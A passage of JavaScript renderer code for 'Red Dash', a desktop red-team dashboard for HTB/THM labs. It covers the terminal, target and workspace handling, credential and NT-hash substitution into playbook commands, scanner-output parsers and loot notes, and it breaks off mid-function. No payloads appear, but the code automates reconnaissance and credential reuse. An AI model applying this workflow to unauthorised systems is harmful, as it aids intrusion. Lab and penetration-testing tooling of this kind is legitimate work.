// Runs sandboxed (contextIsolation on, no Node). Everything that touches the
// system goes through the global `api` that preload.js exposes (it's a
// non-configurable window property, so it can't be re-declared with const here).
const $ = (id) => document.getElementById(id)

// small localStorage wrapper — UI conveniences only (panel widths, collapsed
// groups), so failures are silently ignored
const prefs = {
  get(k, d) { try { const v = localStorage.getItem('rd.' + k); return v == null ? d : JSON.parse(v) } catch { return d } },
  set(k, v) { try { localStorage.setItem('rd.' + k, JSON.stringify(v)) } catch {} }
}

// ---------- TERMINAL ----------
const term = new Terminal({
  cursorBlink: true,
  cursorStyle: 'bar',
  scrollback: 10000,
  fontSize: 14,
  lineHeight: 1.2,
  fontFamily: '"JetBrainsMono Nerd Font", "JetBrains Mono", ui-monospace, monospace',
  theme: {
    background: '#08080b',
    foreground: '#e4e4ec',
    cursor: '#ff3b5c',
    cursorAccent: '#08080b',
    selectionBackground: 'rgba(255, 59, 92, 0.28)',
    black: '#15151d',
    red: '#ff3b5c',
    green: '#3ddc97',
    yellow: '#ffb547',
    blue: '#7aa2ff',
    magenta: '#b392f0',
    cyan: '#5ad1e6',
    white: '#e4e4ec',
    brightBlack: '#55556a',
    brightRed: '#ff6b84',
    brightGreen: '#6ff0b6',
    brightYellow: '#ffcb7d',
    brightBlue: '#a3bfff',
    brightMagenta: '#ccb3f7',
    brightCyan: '#8be3f2',
    brightWhite: '#ffffff'
  }
})
const fit = new FitAddon.FitAddon()
term.loadAddon(fit)
term.open($('terminal'))
fit.fit()

// banner — shown each time a shell connects (launch, and after Reload)
function printBanner() {
  const R = '\x1b[0m'
  const RED = '\x1b[1;38;2;255;59;92m'
  const DIM = '\x1b[38;2;85;85;106m'
  const TXT = '\x1b[38;2;139;139;158m'
  term.writeln('')
  term.writeln(`  ${RED}▶ RED DASH${R}  ${DIM}│${R}  ${TXT}visual red team cockpit${R}`)
  term.writeln(`  ${DIM}${'─'.repeat(38)}${R}`)
  term.writeln('')
}
printBanner()

term.onData(d => api.send('term-in', d))
api.on('term-out', d => term.write(d))
api.send('term-ready', { cols: term.cols, rows: term.rows })

// Ctrl+C copies instead of sending SIGINT only when there's a selection
// (gnome-terminal / VS Code convention) so it never interrupts by accident
term.attachCustomKeyEventHandler((e) => {
  // Ctrl+Shift+K is the app's "filter playbook" shortcut — don't send it to the shell
  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'k') return false
  if (e.type !== 'keydown' || !e.ctrlKey || e.key.toLowerCase() !== 'c') return true
  if (!term.hasSelection()) return true
  api.invoke('copy-text', term.getSelection())
  return false
})

function doFit() {
  try {
    // only resize when the proposed size actually changed — calling fit()
    // unconditionally inside the ResizeObserver can retrigger it in a loop
    const proposed = fit.proposeDimensions()
    if (!proposed) return
    if (proposed.cols === term.cols && proposed.rows === term.rows) return
    fit.fit()
    api.send('term-resize', { cols: term.cols, rows: term.rows })
  } catch {}
}
window.addEventListener('resize', doFit)
setTimeout(doFit, 300)
// panel size changes (resizers, popups) don't fire window.resize
new ResizeObserver(doFit).observe($('terminal'))

// ---------- STATE ----------
let target = { target: '', domain: '', workspace: '' }
let currentOutDir = ''
let shellName = 'shell'
let missingTools = new Set()
const DEFAULTS = {
  WORDLIST: '/usr/share/seclists/Discovery/Web-Content/common.txt',
  SUBLIST: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'
}
// per-box data (ports + creds + checklist), saved to workspaces/<box>/box.json
const EMPTY_BOX = () => ({ ports: '', portsManual: false, creds: [], activeCred: -1, checklist: [] })
let box = EMPTY_BOX()
function activeCred() { return box.creds[box.activeCred] || null }

// single-quote a value for the shell only when it needs it, so plain
// usernames stay readable in the terminal
function shq(s) {
  return /^[A-Za-z0-9_@%+=:,.\/-]+$/.test(s) ? s : `'${s.replace(/'/g, `'\\''`)}'`
}
// `<hash>` is the NT hash; accept a pasted LM:NT pair and keep the NT half
function ntHash(h) { return h.includes(':') ? h.split(':').pop() : h }

function esc(s) {
  return String(s).replace(/[&<>"]/g, c => (
    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]))
}

let toastTimer
function toast(msg) {
  const t = $('toast')
  t.textContent = msg
  t.classList.remove('hidden')
  clearTimeout(toastTimer)
  toastTimer = setTimeout(() => t.classList.add('hidden'), 1600)
}

// ---------- RESIZABLE PANELS ----------
const root = document.documentElement
function applyWidths() {
  root.style.setProperty('--left-w', prefs.get('leftW', 300) + 'px')
  root.style.setProperty('--right-w', prefs.get('rightW', 380) + 'px')
}
applyWidths()
for (const handle of document.querySelectorAll('.resizer')) {
  handle.addEventListener('mousedown', (e) => {
    e.preventDefault()
    const side = handle.dataset.side
    const startX = e.clientX
    const startW = prefs.get(side === 'left' ? 'leftW' : 'rightW', side === 'left' ? 300 : 380)
    handle.classList.add('dragging')
    document.body.classList.add('resizing')
    const move = (ev) => {
      const dx = ev.clientX - startX
      const w = Math.max(220, Math.min(640, side === 'left' ? startW + dx : startW - dx))
      prefs.set(side === 'left' ? 'leftW' : 'rightW', w)
      applyWidths()
    }
    const up = () => {
      handle.classList.remove('dragging')
      document.body.classList.remove('resizing')
      window.removeEventListener('mousemove', move)
      window.removeEventListener('mouseup', up)
    }
    window.addEventListener('mousemove', move)
    window.addEventListener('mouseup', up)
  })
  handle.addEventListener('dblclick', () => {
    prefs.set(handle.dataset.side === 'left' ? 'leftW' : 'rightW', handle.dataset.side === 'left' ? 300 : 380)
    applyWidths()
  })
}

// ---------- TARGET BAR ----------
const inTarget = $('in-target')
const inDomain = $('in-domain')
async function loadTarget() {
  target = await api.invoke('get-target')
  inTarget.value = target.target || ''
  inDomain.value = target.domain || ''
  updateTargetDisplay()
}
function updateTargetDisplay() {
  const t = target.target || target.domain
  const c = activeCred()
  const who = c && c.user ? ` · as ${c.user}` : ''
  $('term-target').textContent = t ? '▸ ' + [target.target, target.domain].filter(Boolean).join(' · ') + who : who.slice(3)
  document.title = t ? `Red Dash ▸ ${t}` : 'Red Dash'
}
function updateTermTitle() {
  $('term-title').textContent = target.workspace ? `${shellName} — ${target.workspace}` : shellName
}
async function setTarget() {
  target = await api.invoke('set-target', {
    target: inTarget.value.trim(), domain: inDomain.value.trim()
  })
  updateTargetDisplay(); renderExamples()
  const seg = document.querySelector('.target-seg')
  seg.classList.add('flash')
  setTimeout(() => seg.classList.remove('flash'), 500)
  toast(target.target || target.domain ? 'Target set — commands updated' : 'Target cleared')
}
$('btn-set-target').onclick = setTarget
for (const inp of [inTarget, inDomain]) {
  inp.addEventListener('keydown', (e) => { if (e.key === 'Enter') setTarget() })
}

// ---------- WORKSPACES ----------
const selWs = $('sel-workspace')
async function loadWorkspaces() {
  const list = await api.invoke('list-workspaces')
  selWs.innerHTML = '<option value="">— pick a box —</option>'
  for (const w of list) {
    const o = document.createElement('option')
    o.value = w; o.textContent = w
    if (w === target.workspace) o.selected = true
    selWs.appendChild(o)
  }
}
function updateDeleteBtn() {
  $('btn-delete-workspace').disabled = !target.workspace
}
async function switchWorkspace(name) {
  await flushNote()
  const res = await api.invoke('set-workspace', name)
  currentOutDir = res.outputDir
  target.workspace = res.workspace
  updateDeleteBtn(); updateTermTitle()
  clearOutputView()
  await loadBox()
  refreshOutput(); renderExamples()
  if (activeTab === 'notes' || activeTab === 'loot') loadNote(activeTab)
}
selWs.onchange = () => { if (selWs.value) switchWorkspace(selWs.value) }

const newboxModal = $('modal-newbox')
const newboxName = $('newbox-name')
async function createWorkspace() {
  const name = newboxName.value.trim()
  newboxModal.classList.add('hidden')
  if (!name) return
  const safe = await api.invoke('new-workspace', name)
  if (!safe) return toast('Invalid box name')
  await loadWorkspaces()
  selWs.value = safe
  await switchWorkspace(safe)
  toast(`Box "${safe}" ready`)
}
$('btn-new-workspace').onclick = () => {
  newboxName.value = ''
  newboxModal.classList.remove('hidden')
  newboxName.focus()
}
$('newbox-create').onclick = createWorkspace
$('newbox-cancel').onclick = () => newboxModal.classList.add('hidden')
newboxName.addEventListener('keydown', (e) => { if (e.key === 'Enter') createWorkspace() })

// ---------- DELETE BOX ----------
const deleteModal = $('modal-delete')
$('btn-delete-workspace').onclick = () => {
  if (!target.workspace) return
  $('delete-warning').textContent =
    `This permanently deletes workspaces/${target.workspace} — all its output, notes, and loot. This cannot be undone.`
  deleteModal.classList.remove('hidden')
  $('delete-cancel').focus()
}
$('delete-cancel').onclick = () => deleteModal.classList.add('hidden')
$('delete-confirm').onclick = async () => {
  const name = target.workspace
  deleteModal.classList.add('hidden')
  clearTimeout(noteTimer); noteDirty = false   // don't write notes into a box being deleted
  await api.invoke('delete-workspace', name)
  target.workspace = ''
  currentOutDir = ''
  selWs.value = ''
  updateDeleteBtn(); updateTermTitle()
  await loadWorkspaces()
  clearOutputView()
  await loadBox()
  refreshOutput(); renderExamples()
  if (activeTab === 'notes' || activeTab === 'loot') loadNote(activeTab)
  toast(`Deleted ${name}`)
}

// ---------- RELOAD ----------
$('btn-reload').onclick = async () => { await flushNote(); location.reload() }

// ---------- VPN STATUS (HTB/THM openvpn or wireguard) ----------
let vpnIp = null   // last seen VPN IP, used as the default LHOST in the toolbox
async function checkVpn() {
  const v = await api.invoke('check-vpn')
  const el = $('vpn-status')
  vpnIp = v.connected ? v.ip : null
  if (v.connected) {
    el.className = 'pill ok'
    $('vpn-text').textContent = v.ip
    el.title = `${v.iface} — click to copy IP`
    el.onclick = async () => { await api.invoke('copy-text', v.ip); toast(`Copied ${v.ip}`) }
  } else {
    el.className = 'pill bad'
    $('vpn-text').textContent = 'offline'
    el.title = 'No tun/tap/wg interface found — connect your HTB/THM VPN'
    el.onclick = null
  }
}
setInterval(checkVpn, 3000)

// ---------- ENV CHECK (tools + seclists) ----------
let envPollTimer = null
let activeHint = null

async function checkEnv() {
  const env = await api.invoke('check-env')
  const dismissed = new Set(env.dismissed || [])
  let missingCount = 0
  missingTools = new Set(Object.entries(env.tools).filter(([, ok]) => !ok).map(([n]) => n))

  // only show what's still missing and not dismissed
  const chips = $('chips')
  chips.innerHTML = ''
  for (const [name, ok] of Object.entries(env.tools)) {
    if (ok || dismissed.has(name)) continue
    missingCount++
    const c = document.createElement('span')
    c.className = 'chip bad' + (activeHint === name ? ' active' : '')
    c.title = 'Click for the install command'
    c.textContent = name
    c.onclick = (e) => {
      e.stopPropagation()
      activeHint = name
      chips.querySelectorAll('.chip').forEach(x => x.classList.toggle('active', x === c))
      showHint(env.hints[name] || ('install ' + name))
    }
    const x = document.createElement('span')
    x.className = 'chip-dismiss'
    x.textContent = '×'
    x.title = "Don't ask about " + name + ' again'
    x.onclick = async (e) => {
      e.stopPropagation()
      await api.invoke('dismiss-tool', name)
      if (activeHint === name) hideHint()
      checkEnv()
    }
    c.appendChild(x)
    chips.appendChild(c)
  }
  if (!missingCount) chips.innerHTML = '<div class="empty">✓ Everything the playbook needs is installed.</div>'

  if (env.wordlist) DEFAULTS.WORDLIST = env.wordlist
  if (env.sublist) DEFAULTS.SUBLIST = env.sublist

  const btnUndismiss = $('btn-undismiss')
  const dismissedCount = (env.dismissed || []).length
  btnUndismiss.classList.toggle('hidden', dismissedCount === 0)
  btnUndismiss.textContent = `Show dismissed (${dismissedCount})`

  const allGood = missingCount === 0
  const toggle = $('btn-setup-toggle')
  toggle.classList.toggle('missing', !allGood)
  toggle.classList.toggle('all-good', allGood)
  $('setup-toggle-label').textContent = allGood ? 'setup ok' : `setup · ${missingCount} missing`

  const sl = $('sb-seclists')
  sl.textContent = env.seclists ? '✓ seclists' : '✗ seclists'
  sl.className = 'sb-item ' + (env.seclists ? 'ok-text' : 'bad-text')
  sl.title = env.seclists || 'SecLists not found — open setup for the install command'

  if (allGood) stopEnvPolling()
  renderExamples()
}
// keep re-checking in the background so chips clear the moment an install finishes
function startEnvPolling() {
  if (envPollTimer) return
  envPollTimer = setInterval(checkEnv, 4000)
}
function stopEnvPolling() {
  if (!envPollTimer) return
  clearInterval(envPollTimer)
  envPollTimer = null
}
function showHint(cmd) {
  $('hint-text').textContent = cmd
  $('hint-bar').classList.remove('hidden')
  const copyBtn = $('hint-copy')
  copyBtn.onclick = async (e) => {
    e.stopPropagation()
    const ok = await api.invoke('copy-text', cmd)
    copyBtn.textContent = ok ? 'Copied' : 'Copy failed'
    setTimeout(() => { copyBtn.textContent = 'Copy' }, 1200)
  }
}
function hideHint() {
  activeHint = null
  $('hint-bar').classList.add('hidden')
  $('chips').querySelectorAll('.chip').forEach(x => x.classList.remove('active'))
}
$('hint-close').onclick = hideHint
$('btn-recheck').onclick = () => { checkEnv(); startEnvPolling() }
$('btn-undismiss').onclick = async () => {
  await api.invoke('undismiss-tools')
  checkEnv(); startEnvPolling()
}

const setupDropdown = $('setup-dropdown')
$('btn-setup-toggle').onclick = (e) => {
  e.stopPropagation()
  setupDropdown.classList.toggle('hidden')
}
document.addEventListener('click', (e) => {
  if (setupDropdown.classList.contains('hidden')) return
  if (e.target.closest('#setup-wrap')) return
  setupDropdown.classList.add('hidden')
})

// ---------- PLAYBOOK (examples) ----------
let allExamples = []
const collapsed = new Set(prefs.get('collapsed', []))
const filterInput = $('ex-filter')

async function loadExamples() {
  allExamples = await api.invoke('get-examples')
  renderExamples()
}
// `forDisplay` swaps cred values for markers that prettyCmd turns into
// highlighted (and, for secrets, masked) chips — so a password never shows
// on screen in the playbook, only in the command that's sent to the shell
const MARK = { user: '\u0001U\u0001', pass: '\u0001P\u0001', hash: '\u0001H\u0001', ports: '\u0001O\u0001' }
function fillVars(cmd, forDisplay = false) {
  let s = cmd
    .replaceAll('{TARGET}', target.target || '{TARGET}')
    .replaceAll('{DOMAIN}', target.domain || '{DOMAIN}')
    .replaceAll('{OUT}', currentOutDir || 'output')
    .replaceAll('{WORDLIST}', DEFAULTS.WORDLIST)
    .replaceAll('{SUBLIST}', DEFAULTS.SUBLIST)
    .replaceAll('{PORTS}', box.ports ? (forDisplay ? MARK.ports : box.ports) : '{PORTS}')
  const c = activeCred()
  if (c) {
    const vals = { user: c.user, pass: c.pass, hash: c.hash && ntHash(c.hash) }
    for (const k of ['user', 'pass', 'hash']) {
      if (vals[k]) s = s.replaceAll(`<${k}>`, forDisplay ? MARK[k] : shq(vals[k]))
    }
  }
  return s
}
// escape, then shorten long absolute paths and highlight what still needs typing
function prettyCmd(cmd) {
  let s = esc(cmd).replaceAll(MARK.ports, `<span class="filled" title="${box.portsManual ? 'typed by you' : 'from nmap'}">${esc(box.ports)}</span>`)
  const c = activeCred()
  if (c) {
    s = s.replaceAll(MARK.user, `<span class="filled cred-fill">${esc(c.user)}</span>`)
      .replaceAll(MARK.pass, '<span class="filled cred-fill" title="password hidden">••••••</span>')
      .replaceAll(MARK.hash, `<span class="filled cred-fill" title="NT hash">${esc(ntHash(c.hash).slice(0, 6))}…</span>`)
  }
  if (currentOutDir) s = s.replaceAll(esc(currentOutDir), '<span class="filled">$OUT</span>')
  for (const k of ['WORDLIST', 'SUBLIST']) {
    const v = esc(DEFAULTS[k])
    s = s.replaceAll(v, `<span class="filled" title="${v}">…/${esc(DEFAULTS[k].split('/').pop())}</span>`)
  }
  return s.replace(/\{[A-Z]+\}|&lt;[a-z_]+&gt;/g, m => `<span class="var">${m}</span>`)
}
function renderExamples() {
  const box = $('examples')
  const q = filterInput.value.trim().toLowerCase()
  box.innerHTML = ''
  const groups = {}
  let shown = 0
  for (const ex of allExamples) {
    if (q && ![ex.tool, ex.name, ex.command, ex.note].join(' ').toLowerCase().includes(q)) continue
    ;(groups[ex.tool] = groups[ex.tool] || []).push(ex)
    shown++
  }
  $('ex-count').textContent = q ? `${shown}/${allExamples.length}` : allExamples.length
  if (!shown) {
    box.innerHTML = `<div class="empty">${q ? 'No commands match “' + esc(q) + '”.' : 'No examples loaded.'}</div>`
    return
  }
  for (const tool of Object.keys(groups)) {
    const g = document.createElement('div')
    // while filtering, show every match regardless of collapsed state
    g.className = 'tool-group' + (!q && collapsed.has(tool) ? ' collapsed' : '')
    const title = document.createElement('div')
    title.className = 'tool-title'
    title.innerHTML = `<span class="caret"></span>${esc(tool)}` +
      (missingTools.has(tool) ? '<span class="missing-tag" title="Not installed — see setup">MISSING</span>' : '') +
      `<span class="count">${groups[tool].length}</span>`
    title.onclick = () => {
      if (collapsed.has(tool)) collapsed.delete(tool); else collapsed.add(tool)
      prefs.set('collapsed', [...collapsed])
      g.classList.toggle('collapsed')
    }
    g.appendChild(title)
    const items = document.createElement('div')
    items.className = 'tool-items'
    for (const ex of groups[tool]) {
      const el = document.createElement('div')
      el.className = 'ex'
      el.title = 'Click to drop into the terminal'
      el.innerHTML = `
        <div class="ex-name">${ex.mine ? '<span class="star">★</span> ' : ''}${esc(ex.name)}</div>
        <div class="ex-cmd">${prettyCmd(fillVars(ex.command, true))}</div>
        ${ex.note ? `<div class="ex-note">${esc(ex.note)}</div>` : ''}`
      el.onclick = () => {
        // fill at click time so it always uses the current ports / cred
        api.send('term-insert', fillVars(ex.command))
        term.focus()
        el.classList.add('sent')
        setTimeout(() => el.classList.remove('sent'), 900)
      }
      if (ex.mine) {
        const del = document.createElement('span')
        del.className = 'ex-del'
        del.textContent = '×'
        del.title = 'Delete this command'
        del.onclick = async (e) => {
          e.stopPropagation()
          if (!confirm(`Delete "${ex.name}"?`)) return
          await api.invoke('delete-example', ex.mineIndex)
          loadExamples()
        }
        el.appendChild(del)
      }
      items.appendChild(el)
    }
    g.appendChild(items)
    box.appendChild(g)
  }
}
filterInput.addEventListener('input', renderExamples)
filterInput.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') { filterInput.value = ''; renderExamples(); term.focus() }
})
$('btn-collapse-all').onclick = () => {
  const tools = [...new Set(allExamples.map(x => x.tool))]
  const allCollapsed = tools.every(t => collapsed.has(t))
  collapsed.clear()
  if (!allCollapsed) tools.forEach(t => collapsed.add(t))
  prefs.set('collapsed', [...collapsed])
  renderExamples()
}

// ---------- ADD EXAMPLE ----------
const modal = $('modal')
$('btn-add-example').onclick = () => { modal.classList.remove('hidden'); $('ex-tool').focus() }
$('ex-cancel').onclick = () => modal.classList.add('hidden')
async function saveExample() {
  const ex = {
    tool: $('ex-tool').value.trim() || 'other',
    name: $('ex-name').value.trim() || 'My command',
    command: $('ex-cmd').value.trim(),
    note: $('ex-note').value.trim()
  }
  if (!ex.command) { $('ex-cmd').focus(); return }
  await api.invoke('add-example', ex)
  modal.classList.add('hidden')
  for (const id of ['ex-cmd', 'ex-name', 'ex-note']) $(id).value = ''
  await loadExamples()
  toast('Command saved')
}
$('ex-save').onclick = saveExample
for (const id of ['ex-tool', 'ex-name', 'ex-cmd', 'ex-note']) {
  $(id).addEventListener('keydown', (e) => { if (e.key === 'Enter') saveExample() })
}

// ---------- OUTPUT ----------
let selectedFile = null
let showRaw = false
const outputView = $('output-view')

function relTime(ms) {
  const s = Math.round((Date.now() - ms) / 1000)
  if (s < 60) return 'just now'
  if (s < 3600) return Math.floor(s / 60) + 'm ago'
  if (s < 86400) return Math.floor(s / 3600) + 'h ago'
  return new Date(ms).toLocaleDateString()
}
function fmtSize(n) {
  if (n < 1024) return n + ' B'
  if (n < 1048576) return (n / 1024).toFixed(1) + ' KB'
  return (n / 1048576).toFixed(1) + ' MB'
}
async function refreshOutput() {
  const list = await api.invoke('list-output')
  const box = $('output-list')
  box.innerHTML = ''
  $('sb-files').textContent = target.workspace
    ? `${list.length} output file${list.length === 1 ? '' : 's'}`
    : 'no box selected'
  if (!target.workspace) {
    box.innerHTML = '<div class="empty">Pick or create a box (top right) to start collecting output.</div>'
    return
  }
  if (!list.length) {
    box.innerHTML = '<div class="empty">No output yet.<br>Run a scan from the playbook — it lands here automatically.</div>'
    return
  }
  for (const f of list) {
    const parts = f.name.split('/')
    const tag = parts.length > 1 ? parts[0] : 'file'
    const rest = parts.length > 1 ? parts.slice(1).join('/') : f.name
    const el = document.createElement('div')
    el.className = 'out-file' + (f.name === selectedFile ? ' active' : '') +
      (Date.now() - f.mtime < 120000 ? ' fresh' : '')
    el.title = `${f.name} · ${fmtSize(f.size)}`
    el.innerHTML = `<span class="tag">${esc(tag)}</span><span class="n">${esc(rest)}</span><span class="t">${esc(relTime(f.mtime))}</span>`
    el.onclick = () => {
      selectedFile = f.name
      showRaw = false
      box.querySelectorAll('.out-file').forEach(x => x.classList.toggle('active', x === el))
      openOutput()
    }
    box.appendChild(el)
  }
  // a scan still writing to the open file — re-render it live
  if (selectedFile && list.some(f => f.name === selectedFile)) openOutput(true)
}
async function openOutput(keepScroll) {
  if (!selectedFile) return
  const scroll = outputView.scrollTop
  const txt = await api.invoke('read-output', selectedFile)
  const summary = buildSummary(selectedFile, txt)
  $('output-view-head').classList.remove('hidden')
  $('output-view-name').textContent = selectedFile
  const rawBtn = $('btn-raw-toggle')
  rawBtn.classList.toggle('hidden', !summary)
  rawBtn.textContent = showRaw ? 'SUMMARY' : 'RAW'
  rawBtn.onclick = () => { showRaw = !showRaw; openOutput() }
  if (!summary || showRaw) {
    outputView.classList.add('raw')
    outputView.textContent = txt || '(empty file)'
  } else {
    outputView.classList.remove('raw')
    outputView.innerHTML = summary
  }
  if (keepScroll) outputView.scrollTop = scroll
}
function clearOutputView() {
  selectedFile = null
  $('output-view-head').classList.add('hidden')
  outputView.classList.remove('raw')
  outputView.innerHTML = target.workspace ? '<div class="empty">Pick a file above to read it.</div>' : ''
}

// fs.watch fires several times per write — coalesce into one refresh
let outputRefreshTimer
api.on('output-changed', () => {
  clearTimeout(outputRefreshTimer)
  outputRefreshTimer = setTimeout(() => { refreshOutput(); autoPorts() }, 250)
})
$('btn-refresh-output').onclick = refreshOutput
// keep the "2m ago" labels honest
setInterval(() => { if (activeTab === 'output' && target.workspace) refreshOutput() }, 60000)

// ---- parsers: per-tool "just the findings" summaries ----
// Return an HTML string, or null to fall back to the raw file.
function buildSummary(relPath, txt) {
  const tool = relPath.split('/')[0]
  if (relPath.endsWith('.xml') && txt.includes('<nmaprun')) return renderNmapTable(txt)
  if (tool === 'ffuf' && relPath.toLowerCase().endsWith('.json')) return renderFfuf(txt)
  if (tool === 'gobuster') return renderGobuster(txt)
  if (tool === 'feroxbuster') return renderFerox(txt)
  if (tool === 'nikto') return renderPrefixFindings(txt, l => l.startsWith('+ '))
  if (tool === 'wpscan') return renderPrefixFindings(txt, l => l.startsWith('[+]') || l.startsWith('[!]'))
  if (tool === 'whatweb') return renderWhatweb(txt)
  return null
}
function renderNmapTable(xmlText) {
  let doc
  try { doc = new DOMParser().parseFromString(xmlText, 'text/xml') }
  catch { return null }
  const hosts = [...doc.querySelectorAll('host')]
  if (!hosts.length) return '<div class="empty">No hosts yet — the scan may still be running.</div>'
  let html = ''
  for (const h of hosts) {
    const addr = h.querySelector('address')?.getAttribute('addr') || '?'
    const ports = [...h.querySelectorAll('port')]
      .filter(p => p.querySelector('state')?.getAttribute('state') === 'open')
    html += `<div class="nmap-host">${esc(addr)} <span class="dim">· ${ports.length} open</span></div>`
    if (!ports.length) { html += '<div class="dim">No open ports found.</div>'; continue }
    html += '<table class="out-table"><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody>'
    for (const p of ports) {
      const svc = p.querySelector('service')
      const ver = ['product', 'version', 'extrainfo'].map(a => svc?.getAttribute(a)).filter(Boolean).join(' ')
      html += `<tr><td class="port">${esc(p.getAttribute('portid'))}/${esc(p.getAttribute('protocol'))}</td>` +
        `<td class="svc">${esc(svc?.getAttribute('name') || '')}</td><td class="ver">${esc(ver)}</td></tr>`
    }
    html += '</tbody></table>'
  }
  return html
}
// rows are arrays of cells; `statusCol` (index) gets colored by HTTP class
function buildTable(headers, rows, statusCol = -1) {
  if (!rows.length) return '<div class="empty">Nothing found yet — the scan may still be running, or everything was filtered.</div>'
  let html = `<div class="dim">${rows.length} result${rows.length === 1 ? '' : 's'}</div>`
  html += '<table class="out-table"><thead><tr>' + headers.map(h => `<th>${esc(h)}</th>`).join('') + '</tr></thead><tbody>'
  for (const r of rows) {
    html += '<tr>' + r.map((c, i) => i === statusCol
      ? `<td class="st st-${esc(String(c)[0])}">${esc(c)}</td>`
      : `<td>${esc(c)}</td>`).join('') + '</tr>'
  }
  return html + '</tbody></table>'
}
function renderFfuf(txt) {
  let data
  try { data = JSON.parse(txt) } catch { return null }
  const rows = (data.results || []).map(r => {
    let display = r.url || r.input?.FUZZ || ''
    // vhost fuzzing keeps `url` constant; the discovered name is in `host`
    if (r.host) {
      try {
        if (new URL(r.url).hostname !== r.host) display = r.host
      } catch { if (r.host !== r.url) display = r.host }
    }
    return [r.status, r.length, display]
  })
  return buildTable(['Status', 'Size', 'URL / Host'], rows, 0)
}
function renderGobuster(txt) {
  const re = /^(.+?)\s+\(Status:\s*(\d+)\)\s*\[Size:\s*(\d+)\]/
  const rows = []
  for (const line of txt.split('\n')) {
    const m = line.match(re)
    if (m) rows.push([m[2], m[3], m[1].replace(/^Found:\s*/, '').trim()])
  }
  if (!rows.length) return null
  return buildTable(['Status', 'Size', 'Found'], rows, 0)
}
function renderFerox(txt) {
  const re = /^(\d{3})\s+\S+\s+\d+l\s+\d+w\s+(\d+)c\s+(\S+)/
  const rows = []
  for (const line of txt.split('\n')) {
    const m = line.match(re)
    if (m) rows.push([m[1], m[2], m[3]])
  }
  if (!rows.length) return null
  return buildTable(['Status', 'Size', 'URL'], rows, 0)
}
function renderPrefixFindings(txt, matchFn) {
  const lines = txt.split('\n').map(l => l.trim()).filter(matchFn)
  if (!lines.length) return null
  return '<ul class="finding-list">' +
    lines.map(l => `<li${l.startsWith('[!]') ? ' class="warn"' : ''}>${esc(l)}</li>`).join('') + '</ul>'
}
function renderWhatweb(txt) {
  const tags = [...txt.matchAll(/([A-Za-z][\w\-]*)\[([^\]]*)\]/g)]
  if (!tags.length) return null
  return '<ul class="finding-list">' + tags.map(([, k, v]) => `<li><b>${esc(k)}</b>  ${esc(v || '(detected)')}</li>`).join('') + '</ul>'
}

// ---------- NOTES / LOOT TABS ----------
let activeTab = 'output'
const tabButtons = { output: $('tab-output'), notes: $('tab-notes'), loot: $('tab-loot'), creds: $('tab-creds'), checklist: $('tab-checklist') }
const notesView = $('notes-view')
const lootView = $('loot-view')
const savedMsg = $('note-saved-msg')
let noteTimer = null
let noteDirty = false

async function loadNote(type) {
  const el = type === 'notes' ? notesView : lootView
  el.value = await api.invoke('read-note', type)
  el.disabled = !target.workspace
  if (!target.workspace) el.value = ''
  el.placeholder = target.workspace
    ? (type === 'notes' ? 'Notes for this box…  (autosaves · Ctrl+S)' : 'Creds, hashes, flags…  (autosaves · Ctrl+S)')
    : 'Pick or create a box first.'
}
// saves whatever's pending NOW — called before anything that changes which
// box the main process writes to, so text never lands in the wrong box
async function flushNote() {
  clearTimeout(noteTimer)
  if (!noteDirty || (activeTab !== 'notes' && activeTab !== 'loot')) { noteDirty = false; return }
  noteDirty = false
  const text = (activeTab === 'notes' ? notesView : lootView).value
  await api.invoke('write-note', activeTab, text)
  savedMsg.classList.remove('hidden')
  setTimeout(() => savedMsg.classList.add('hidden'), 1200)
}
for (const el of [notesView, lootView]) {
  el.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key.toLowerCase() === 's') { e.preventDefault(); noteDirty = true; flushNote() }
  })
  el.addEventListener('input', () => {
    noteDirty = true
    clearTimeout(noteTimer)
    noteTimer = setTimeout(flushNote, 700)
  })
}
async function switchTab(tab) {
  await flushNote()
  activeTab = tab
  for (const [k, btn] of Object.entries(tabButtons)) btn.classList.toggle('active', k === tab)
  $('output-pane').classList.toggle('hidden', tab !== 'output')
  notesView.classList.toggle('hidden', tab !== 'notes')
  lootView.classList.toggle('hidden', tab !== 'loot')
  $('creds-pane').classList.toggle('hidden', tab !== 'creds')
  $('checklist-pane').classList.toggle('hidden', tab !== 'checklist')
  $('btn-refresh-output').classList.toggle('hidden', tab !== 'output')
  if (tab === 'notes' || tab === 'loot') { await loadNote(tab); (tab === 'notes' ? notesView : lootView).focus() }
  if (tab === 'creds') { renderCreds(); if (target.workspace) $('cred-user').focus() }
  if (tab === 'checklist') { renderChecklist(); if (target.workspace) $('check-input').focus() }
}
for (const tab of Object.keys(tabButtons)) tabButtons[tab].onclick = () => switchTab(tab)
window.addEventListener('beforeunload', () => { if (noteDirty) flushNote() })

// ---------- BOX DATA (ports + creds) ----------
async function loadBox() {
  box = target.workspace ? await api.invoke('read-box') : EMPTY_BOX()
  renderPorts(); renderCreds(); renderChecklist(); updateTargetDisplay()
  await autoPorts(true)
}
function saveBox() {
  if (target.workspace) api.invoke('write-box', box)
}

// ---------- PORTS (auto from nmap, or typed by hand) ----------
const inPorts = $('in-ports')
function renderPorts() {
  const on = !!target.workspace
  inPorts.disabled = !on
  $('btn-ports-auto').disabled = !on
  inPorts.value = box.ports
  inPorts.placeholder = on ? 'auto from nmap' : 'pick a box'
  inPorts.classList.toggle('manual', box.portsManual)
  $('btn-ports-auto').classList.toggle('on', on && !box.portsManual)
  inPorts.title = box.portsManual
    ? 'Typed by you — click AUTO to fill from nmap again'
    : 'Filled automatically from this box\'s nmap scans (type to override)'
}
// quiet = don't toast (used when just switching boxes)
async function autoPorts(quiet = false) {
  if (!target.workspace || box.portsManual) return
  const found = await api.invoke('get-ports')
  if (found === box.ports) return
  box.ports = found
  saveBox(); renderPorts(); renderExamples()
  if (!quiet && found) toast(`Ports from nmap: ${found}`)
}
function commitPorts() {
  if (!target.workspace) return
  // keep only real ports / ranges ("22", "1-1000") — this ends up in the shell
  const typed = (inPorts.value.match(/\d+(?:-\d+)?/g) || []).join(',')
  if (typed === box.ports && box.portsManual) return renderPorts()
  if (!typed) {
    // cleared the box → go back to automatic
    box.portsManual = false
    box.ports = ''
    saveBox(); renderPorts(); renderExamples(); autoPorts()
    return
  }
  if (typed === box.ports) return renderPorts()   // unchanged, stay automatic
